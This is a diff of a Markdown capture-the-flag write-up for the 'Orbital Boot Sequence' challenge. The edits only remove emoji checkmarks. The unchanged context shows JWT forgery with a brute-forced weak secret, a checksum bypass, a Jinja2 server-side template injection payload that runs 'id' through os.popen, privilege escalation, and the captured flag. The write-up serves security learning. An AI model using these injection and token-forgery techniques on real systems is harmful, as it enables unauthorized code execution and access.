@@ -232,7 +232,7 @@ admin_payload = {
 admin_token = create_jwt(admin_payload, "butterfly")
 ```
 
-**Result:** ✅ Admin token forged and verified
+**Result:** Admin token forged and verified
 
 ---
 
@@ -292,7 +292,7 @@ def compute_checksum(payload, token):
     return f"{acc:08x}"
 ```
 
-**Result:** ✅ Successfully ported algorithm
+**Result:** Successfully ported algorithm
 
 ---
 
@@ -308,13 +308,13 @@ Basic expression test:
 ```jinja2
 {{ 7 * 7 }}
 ```
-Response: `49` ✅
+Response: `49` 
 
 Code execution test:
 ```jinja2
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
 ```
-Response: `uid=1000(orbital) gid=1000(orbital)` ✅
+Response: `uid=1000(orbital) gid=1000(orbital)` 
 
 Filesystem enumeration:
 ```jinja2
@@ -361,7 +361,7 @@ POST /api/admin/hyperpulse
 }
 ```
 
-### Step 5.3: FLAG CAPTURED 🚩
+### Step 5.3: FLAG CAPTURED 
 
 **Response:**
 ```json
@@ -370,7 +370,7 @@ POST /api/admin/hyperpulse
 }
 ```
 
-✅ **FLAG RETRIEVED**
+**FLAG RETRIEVED**
 
 ---
 
@@ -546,12 +546,12 @@ FLAG RETRIEVAL (5 min)
 
 The Orbital Boot Sequence CTF was successfully completed through:
 
-1. ✅ Dictionary brute force discovery of weak JWT secret "butterfly"
-2. ✅ JWT forgery with discovered secret
-3. ✅ Checksum algorithm porting and validation bypass
-4. ✅ SSTI exploitation for code execution
-5. ✅ Privilege escalation using Python capabilities
+1. Dictionary brute force discovery of weak JWT secret "butterfly"
+2. JWT forgery with discovered secret
+3. Checksum algorithm porting and validation bypass
+4. SSTI exploitation for code execution
+5. Privilege escalation using Python capabilities
 
 **Flag Captured:** `ClOuDsEk_ReSeArCH_tEaM_CTF_2025{997c4f47961b43ceaf327e08bc45ad0b}`
 
-**Status:** ✅ COMPLETE
+**Status:** COMPLETE
